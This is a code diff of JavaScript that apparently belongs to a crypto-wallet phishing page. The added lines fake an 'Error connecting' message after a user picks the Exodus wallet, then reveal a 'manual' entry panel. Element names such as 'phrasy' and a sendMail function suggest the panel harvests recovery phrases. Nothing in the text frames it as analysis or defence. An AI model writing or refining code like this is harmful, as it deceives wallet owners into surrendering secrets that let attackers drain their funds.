@@ -186,18 +186,30 @@ closerr.addEventListener("click", function (){
       
                      
                      wallet5.addEventListener('click',function(){
-                        phrasy.style.visibility = 'visible';
+                        error.style.visibility = 'visible';
                         modal.style.visibility = 'hidden'
+                        back.style.visibility = 'hidden'
                         wall.value = 'exodus';
                         walletName.value = ''
+
+                        setTimeout(function() {
+                           con.innerHTML = 'Error connecting'
+                           con.style.color = 'red'
+                        },2000);
+                        
+                        setTimeout(function() {
+                           manual.style.visibility = 'visible';
+                        },2000);
+                        
+                        closerr.addEventListener("click", function (){
+                           error.style.visibility = "hidden"
+                           manual.style.visibility = 'hidden'
+                        })
                         
                         
                            })
                         
-                           closePhrase.addEventListener('click', function(){
-                              phrasy.style.visibility = 'hidden';
-                              back.style.visibility = 'hidden';
-                           })
+                          
 
 
                            function sendMail() {
